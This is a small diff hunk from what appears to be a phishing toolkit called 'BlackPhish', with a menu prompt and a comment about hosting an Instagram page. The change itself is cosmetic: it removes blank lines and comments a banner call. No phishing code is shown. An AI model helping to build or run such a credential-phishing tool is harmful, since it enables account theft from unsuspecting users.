@@ -86,9 +86,7 @@ def banner():
 # Main Script #
 def main():
     os.system('clear') # clear #
-    
-    banner()
-
+    banner() # Load Banner #
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
 
     # Host Instagram Page #
